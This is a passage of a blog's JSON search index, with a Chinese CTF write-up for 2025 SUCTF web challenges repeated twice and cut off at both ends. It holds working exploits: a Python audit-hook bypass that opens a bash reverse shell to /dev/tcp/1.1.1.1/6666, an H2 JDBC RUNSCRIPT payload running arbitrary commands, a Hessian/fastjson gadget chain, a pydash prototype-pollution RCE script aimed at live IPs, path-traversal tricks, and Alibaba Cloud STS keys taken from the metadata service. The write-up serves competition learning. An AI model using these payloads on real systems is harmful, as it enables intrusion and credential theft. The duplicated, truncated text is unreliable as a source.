{\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 友链名称2 友链描述2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"一名大二在读学生\nSyclover \u0026amp; 0XFFF 成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、云安全等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n会打点小游戏（其实从小学之前就开始打游戏了hh\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: 